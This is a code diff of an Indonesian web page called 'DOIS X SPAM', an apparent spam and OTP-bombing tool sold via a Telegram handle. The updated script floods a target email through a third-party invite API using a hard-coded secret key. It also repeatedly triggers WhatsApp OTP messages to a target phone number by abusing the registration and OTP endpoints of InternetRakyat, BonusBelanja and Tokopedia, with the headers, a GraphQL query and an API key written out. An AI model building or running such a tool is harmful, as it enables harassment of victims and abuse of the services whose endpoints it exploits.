@@ -5,39 +5,36 @@
   <title>DOIS X SPAM</title>
   <style>
     *{margin:0;padding:0;box-sizing:border-box;}
-    body{background:#0a0a0a;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;color:#fff;flex-direction:column;gap:20px;}
-    .card{background:#1a1a1a;padding:40px;border-radius:20px;border:1px solid #ff1493;text-align:center;width:400px;max-width:94%;}
-    input,button,select{width:100%;padding:14px;margin:8px 0;border-radius:10px;border:none;font-size:16px;}
-    input,select{background:#111;color:#fff;border:1px solid #333;outline:none;transition:all 0.3s cubic-bezier(0.25,0.1,0.25,1);}
-    input:focus,select:focus{border-color:#ff1493;background:#1a1a1a;box-shadow:0 0 0 1px rgba(255,20,147,0.3);transform:scale(1.02);}
-    input:active{transform:scale(0.98);border-color:#007aff;}
-    input::placeholder{color:#666;}
+    body{background:#0a0a0a;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:sans-serif;color:#fff;padding:20px;}
+    .card{background:#1a1a1a;padding:40px;border-radius:20px;border:1px solid #ff1493;text-align:center;width:500px;max-width:100%;}
+    input,button{width:100%;padding:14px;margin:8px 0;border-radius:10px;border:none;font-size:16px;}
+    input{background:#111;color:#fff;border:1px solid #333;outline:none;transition:all 0.3s;}
+    input:focus{border-color:#ff1493;background:#1a1a1a;box-shadow:0 0 0 1px rgba(255,20,147,0.3);transform:scale(1.02);}
     button{background:#ff1493;color:#fff;font-weight:bold;cursor:pointer;transition:0.4s;}
     button:hover{background:#ff69b4;}
-    #msg{color:#ff4444;min-height:24px;}
     .hidden{display:none !important;}
     .input-row{display:flex;gap:10px;}
     .input-row input{flex:1;}
-    #log{text-align:left;font-size:12px;color:#666;max-height:150px;overflow-y:auto;margin-top:10px;background:#111;padding:10px;border-radius:8px;}
-    .log-success{color:#00ff88;}
-    .log-error{color:#ff4444;}
-    .log-warning{color:#ffaa00;}
-    #status{color:#888;margin-top:10px;}
-    #counter{color:#555;margin-top:8px;}
+    #log{text-align:left;font-size:12px;color:#666;max-height:200px;overflow-y:auto;margin-top:10px;background:#111;padding:10px;border-radius:8px;}
+    .log-success{color:#00ff88;font-weight:bold;}
+    #status{color:#888;margin-top:10px;font-weight:bold;}
+    #counter{color:#555;margin-top:8px;font-weight:bold;}
     .btn-logout{background:#333;margin-top:10px;}
     .btn-logout:hover{background:#555;}
-    .tab{display:flex;gap:10px;margin-bottom:10px;}
-    .tab button{flex:1;background:#333;color:#fff;padding:10px;border-radius:10px;border:none;cursor:pointer;font-weight:bold;transition:0.2s;}
+    .tab{display:flex;gap:10px;margin-bottom:10px;flex-wrap:wrap;}
+    .tab button{flex:1;background:#333;color:#fff;padding:10px;border-radius:10px;border:none;cursor:pointer;font-weight:bold;transition:0.2s;min-width:80px;}
     .tab button.active{background:#ff1493;}
     .tab-content{display:none;}
     .tab-content.active{display:block;}
+    .platform-list{text-align:left;font-size:13px;color:#666;margin:10px 0;padding:10px;background:#111;border-radius:8px;border:1px solid #333;}
+    .platform-list span{color:#ff1493;}
   </style>
 </head>
 <body>
 
 <div class="card" id="loginCard">
   <h1 style="color:#ff1493;font-size:32px;">DOIS X SPAM</h1>
-  <p style="color:#666;">Login dengan Firebase</p>
+  <p style="color:#666;">Telegram : @doisx1</p>
   <input type="email" id="emailInput" placeholder="Email..." value="" />
   <input type="password" id="passwordInput" placeholder="Password..." />
   <button onclick="login()">Login</button>
@@ -46,8 +43,8 @@
 
 <div class="card hidden" id="spamCard">
   <h1 style="color:#ff1493;font-size:32px;">DOIS X SPAM</h1>
-  <p style="color:#666;">Pilih Mode Spam</p>
-  
+  <p style="color:#666;">Telegram : @doisx1</p>
+
   <div class="tab">
     <button class="active" onclick="switchTab('email')">Spam Email</button>
     <button onclick="switchTab('wa')">OTP WhatsApp</button>
@@ -56,23 +53,28 @@
   <div id="tabEmail" class="tab-content active">
     <input type="email" id="emailTarget" placeholder="Email Target" value="" />
     <div class="input-row">
-      <input type="number" id="emailJumlah" value="25" placeholder="Jumlah spam" />
-      <input type="number" id="emailDelay" value="1500" placeholder="Delay Spam" />
+      <input type="number" id="emailJumlah" value="" placeholder="Jumlah" />
+      <input type="number" id="emailDelay" value="" placeholder="Delay" />
     </div>
     <button onclick="spamEmail()">Kirim Spam Email</button>
-    <div id="statusEmail">Siap</div>
+    <div id="statusEmail"></div>
     <div id="logEmail"></div>
     <div id="counterEmail">0 / 0</div>
   </div>
 
   <div id="tabWA" class="tab-content">
+    <div class="platform-list">
+      <span>-</span> InternetRakyat <br>
+      <span>-</span> BonusBelanja <br>
+      <span>-</span> Tokopedia
+    </div>
+
     <input type="text" id="waNomor" placeholder="628123456789" value="" />
     <div class="input-row">
-      <input type="number" id="waJumlah" value="25" placeholder="Jumlah Spam" />
-      <input type="number" id="waDelay" value="1500" placeholder="Delay Spam" />
+      <input type="number" id="waJumlah" value="" placeholder="Jumlah" />
     </div>
-    <button onclick="spamWA()">Kirim Spam</button>
-    <div id="statusWA">Siap</div>
+    <button onclick="spamWA()">Kirim Spam WhatsApp</button>
+    <div id="statusWA"></div>
     <div id="logWA"></div>
     <div id="counterWA">0 / 0</div>
   </div>
@@ -86,10 +88,8 @@
 <script>
   var _cfg = "eyJhcGlLZXkiOiJBSXphU3lDc1liRTFVa2NsaTZBUEhhUkdhWkRhWjVOTkFZV0NfUlEiLCJhdXRoRG9tYWluIjoiZG9pc3gtZGMyM2IuZmlyZWJhc2VhcHAuY29tIiwiZGF0YWJhc2VVUkwiOiJodHRwczovL2RvaXN4LWRjMjNiLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbSIsInByb2plY3RJZCI6ImRvaXN4LWRjMjNiIiwic3RvcmFnZUJ1Y2tldCI6ImRvaXN4LWRjMjNiLmZpcmViYXNlc3RvcmFnZS5hcHAiLCJtZXNzYWdpbmdTZW5kZXJJZCI6IjYzNjM4MTI5NDc4OSIsImFwcElkIjoiMTo2MzYzODEyOTQ3ODk6d2ViOjllY2NmN2YzMGIxOTFjOGUxNjQwYWMiLCJtZWFzdXJlbWVudElkIjoiRy1MOFBIUjRFUzFEIn0=";
   var firebaseConfig = JSON.parse(atob(_cfg));
-
   firebase.initializeApp(firebaseConfig);
   var auth = firebase.auth();
-
   auth.signOut();
 
   function switchTab(tab) {
@@ -108,7 +108,6 @@
     var email = document.getElementById('emailInput').value;
     var pwd = document.getElementById('passwordInput').value;
     var msg = document.getElementById('msg');
-
     auth.signInWithEmailAndPassword(email, pwd)
       .then(function() {
         document.getElementById('loginCard').classList.add('hidden');
@@ -133,16 +132,10 @@
     var status = document.getElementById('statusEmail');
     var log = document.getElementById('logEmail');
     var counter = document.getElementById('counterEmail');
-
-    if (!email || !email.includes('@')) {
-      status.textContent = 'Email target tidak valid!';
-      return;
-    }
-
+    if (!email || !email.includes('@')) { status.textContent = 'Email tidak valid!'; return; }
     log.innerHTML = '';
     status.textContent = 'Mengirim...';
     var success = 0, failed = 0;
-
     var url = 'https://api.agentfy.ai/v1/beta';
     var headers = {
       'Accept': 'application/json',
@@ -150,7 +143,6 @@
       'api-key': 'secret-a9387bc0-ff57-4d94-957d-fe2e44e06412',
       'agent-id': 'agent-6c5d5cbf-f100-43d9-b1f0-862dc3d578a2'
     };
-
     for (var i = 0; i < total; i++) {
       try {
         var resp = await fetch(url, {
@@ -160,78 +152,123 @@
         });
         if (resp.status === 201) {
           success++;
-          log.innerHTML += '<div class="log-success">[' + (i+1) + '] Beta invite terkirim</div>';
-        } else {
-          failed++;
-          log.innerHTML += '<div class="log-error">[' + (i+1) + '] ' + resp.status + '</div>';
+          log.innerHTML += '<div class="log-success">[' + (i+1) + '] Invite code Sudah terkirim ke target</div>';
         }
       } catch (e) {
         failed++;
-        log.innerHTML += '<div class="log-warning">[' + (i+1) + '] Error</div>';
       }
       status.textContent = (i+1) + '/' + total + ' | ' + success + ' | ' + failed;
       counter.textContent = success + '  ' + failed + '  ' + (i+1) + '/' + total;
       await new Promise(function(r) { setTimeout(r, delayMs * (0.7 + Math.random() * 0.6)); });
       log.scrollTop = log.scrollHeight;
     }
-
-    status.textContent = success > 0 ? 'Selesai! ' + success + ' berhasil ke ' + email : 'Gagal! ' + failed + '/' + total;
+    status.textContent = success > 0 ? 'Selesai! ' + success + ' berhasil' : 'Gagal! ' + failed + '/' + total;
   }
 
   async function spamWA() {
     var nomor = document.getElementById('waNomor').value.trim();
     var total = parseInt(document.getElementById('waJumlah').value) || 25;
-    var delayMs = parseInt(document.getElementById('waDelay').value) || 1500;
     var status = document.getElementById('statusWA');
     var log = document.getElementById('logWA');
     var counter = document.getElementById('counterWA');
 
     if (!nomor || nomor.length < 10) {
-      status.textContent = 'Nomor tidak valid! Minimal 10 digit.';
+      status.textContent = 'Nomor tidak valid';
       return;
     }
 
     log.innerHTML = '';
     status.textContent = 'Mengirim...';
-    var success = 0, failed = 0;
+    var success = 0;
+
+    var internetRakyatUrl = 'https://internetrakyat.id/api/app/auth/send-otp-register';
+    var internetRakyatHeaders = {
+      'Accept': 'application/json, text/plain, */*',
+      'Content-Type': 'application/json',
+      'x-api-key': '280999!FTTH'
+    };
 
     var bonusUrl = 'https://www.bonusbelanja.com/api/auth/registration/app';
     var bonusHeaders = {
       'Content-Type': 'application/json'
     };
 
-    for (var i = 0; i < total; i++) {
-      try {
-        var bonusPayload = {
-          phone: nomor,
-          name: 'dois',
-          agreeTnc: true,
-          agreeContact: true
-        };
-        var resp = await fetch(bonusUrl, {
-          method: 'POST',
-          headers: bonusHeaders,
-          body: JSON.stringify(bonusPayload)
-        });
-        var data = await resp.json();
-        if (data.error === false || data.data) {
-          success++;
-          log.innerHTML += '<div class="log-success">[' + (i+1) + '] Registrasi berhasil ke ' + nomor + '</div>';
-        } else {
-          failed++;
-          log.innerHTML += '<div class="log-error">[' + (i+1) + '] ' + (data.message || 'Gagal') + '</div>';
+    var tokopediaUrl = 'https://gql.tokopedia.com/graphql/OTPRequest';
+    var tokopediaHeaders = {
+      'Content-Type': 'application/json',
+      'x-tkpd-lite-service': 'oauthx',
+      'x-version': '04f884c',
+      'Accept': '*/*'
+    };
+    var tokopediaQuery = 'query OTPRequest($otpType: String!, $mode: String, $msisdn: String, $email: String, $otpDigit: Int, $ValidateToken: String, $UserIDEnc: String, $UserIDSigned: String, $Signature: String, $MsisdnEnc: String, $EmailEnc: String, $source: String) {\n  OTPRequest: OTPRequestV2(otpType: $otpType, mode: $mode, msisdn: $msisdn, email: $email, otpDigit: $otpDigit, ValidateToken: $ValidateToken, UserIDEnc: $UserIDEnc, UserIDSigned: $UserIDSigned, Signature: $Signature, MsisdnEnc: $MsisdnEnc, EmailEnc: $EmailEnc, source: $source) {\n    success\n    message\n    errorMessage\n    sse_session_id\n    list_device_receiver\n    error_code\n    message_title\n    message_sub_title\n    message_img_link\n    __typename\n  }\n}';
+
+    var platforms = [
+      {
+        name: 'InternetRakyat',
+        url: internetRakyatUrl,
+        method: 'POST',
+        headers: internetRakyatHeaders,
+        body: JSON.stringify({ phone_number: nomor }),
+        checkSuccess: function(data) {
+          return data.statusCode === 200 && data.message === 'OTP terkirim';
         }
-      } catch (e) {
-        failed++;
-        log.innerHTML += '<div class="log-warning">[' + (i+1) + '] Error</div>';
+      },
+      {
+        name: 'BonusBelanja',
+        url: bonusUrl,
+        method: 'POST',
+        headers: bonusHeaders,
+        body: JSON.stringify({ phone: nomor, name: 'dois', agreeTnc: true, agreeContact: true }),
+        checkSuccess: function(data) {
+          return data.error === false || data.data;
+        }
+      },
+      {
+        name: 'Tokopedia',
+        url: tokopediaUrl,
+        method: 'POST',
+        headers: tokopediaHeaders,
+        body: JSON.stringify([{
+          operationName: 'OTPRequest',
+          variables: {
+            msisdn: nomor,
+            MsisdnEnc: '',
+            EmailEnc: '',
+            otpType: '116',
+            mode: 'whatsapp',
+            otpDigit: 6
+          },
+          query: tokopediaQuery
+        }]),
+        checkSuccess: function(data) {
+          return data && data[0] && data[0].data && data[0].data.OTPRequest && data[0].data.OTPRequest.success === true;
+        }
       }
-      status.textContent = (i+1) + '/' + total + ' | ' + success + ' | ' + failed;
-      counter.textContent = success + '  ' + failed + '  ' + (i+1) + '/' + total;
-      await new Promise(function(r) { setTimeout(r, delayMs * (0.7 + Math.random() * 0.6)); });
-      log.scrollTop = log.scrollHeight;
+    ];
+
+    for (var i = 0; i < total; i++) {
+      for (var p = 0; p < platforms.length; p++) {
+        var platform = platforms[p];
+        try {
+          var resp = await fetch(platform.url, {
+            method: platform.method,
+            headers: platform.headers,
+            body: platform.body
+          });
+          var data = await resp.json();
+          if (platform.checkSuccess(data)) {
+            success++;
+            log.innerHTML += '<div class="log-success">[' + (i+1) + ':' + platform.name + '] OTP terkirim</div>';
+          }
+        } catch (e) {}
+        status.textContent = (i+1) + '/' + total + ' | ' + success;
+        counter.textContent = success + '  ' + (i+1) + '/' + total;
+        log.scrollTop = log.scrollHeight;
+        await new Promise(function(r) { setTimeout(r, 1000); });
+      }
     }
 
-    status.textContent = success > 0 ? 'Selesai! ' + success + ' berhasil ke ' + nomor : 'Gagal! ' + failed + '/' + total;
+    status.textContent = 'Selesai! ' + success + ' berhasil';
   }
 
   auth.onAuthStateChanged(function(user) {
